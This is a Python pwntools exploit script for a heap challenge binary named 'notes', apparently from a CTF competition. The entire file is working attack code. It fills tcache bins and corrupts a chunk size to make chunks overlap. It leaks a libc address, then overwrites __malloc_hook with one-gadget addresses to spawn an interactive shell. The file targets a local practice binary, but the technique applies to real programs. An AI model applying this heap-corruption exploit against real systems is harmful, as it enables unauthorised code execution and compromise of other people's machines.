from pwn import *
import time
envi={"LD_PRELOAD":"./libc-2.31.so"}
#libc=ELF('./notes').libc
#gadgets=[0xcb79d,0xcb7a0,0xe926b,0xe9277]
gadgets=[0xe6ce3,0xe6ce6,0xe6ce9]
libc=ELF('./libc-2.31.so')
for gadget in gadgets:
	target=process(['/media/sf_kalishared/livectfs/tghack2020/Crap/ld-2.31.so','./notes'],env=envi)
	def init(option):
		print(target.recvuntil(">>>     "))
		target.sendline(str(option))

	def create():
		init(1)

	def write(index,titlelen,contlen,title,content):
		init(2)
		print(target.recvuntil("Index: "))
		target.sendline(str(index))
		print(target.recvuntil(":   "))
		target.sendline(str(titlelen))
		print(target.recvuntil(":   "))
		target.sendline(str(contlen))
		print(target.recvuntil(":  "))
		time.sleep(1)
		target.send(title)
		print(target.recvuntil(":    "))
		time.sleep(1)
		target.send(content)

	def edit(index,title,content):
		init(3)
		print(target.recvuntil("Index:     "))
		target.sendline(str(index))
		print(target.recvuntil(":  "))
		target.send(title)
		print(target.recvuntil(":  "))
		target.send(content)
		
	def read(index):
		init(4)
		print(target.recvuntil("Index:     "))
		target.sendline(str(index))
		title=target.recvline().strip("\n")
		content=target.recvline().strip("\n")
		return title,content

	def delete(index):
		init(5)
		print(target.recvuntil(":     "))
		target.sendline(str(index))

	for i in range(7):
		create()
		write(0,0x2,0x60,"A\n","A\n")
		delete(0)

	for i in range(7):
		create()

	write(0,0x2,0x60,"A\n","A\n")
	write(1,0x500,0x500,"A\n","A\n")
	write(2,0x500,0x500,"A\n","A\n")
	create()
	delete(0)
	create()
	write(0,0x10,0x60,p64(0)*3+p64(0x510*4+1),"A\n")
	delete(1)
	write(3,0x500,0x500,"A\n","A\n")
	title,content=read(3)
	libc_leak=u64(content[8:16])
	libc_base=libc_leak-libc.symbols["__malloc_hook"]-0x70
	libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
	libc_gadget=libc_base+gadget
	print(hex(libc_base))
	edit(3,p64(libc_leak)*2+"\n",p64(libc_leak)*2+"\n")
	write(4,0x80,0x60,"A\n","A\n")
	delete(4)
	pause()
	edit(3,"A\n",p64(libc_malloc_hook-0x2b-0x8)+"\n")
	write(5,0x60,0x60,"A"*0x23+p64(libc_gadget)+"\n","A"*0x23+p64(libc_gadget)+"\n")
	create()


	target.interactive()

	
	
	
	

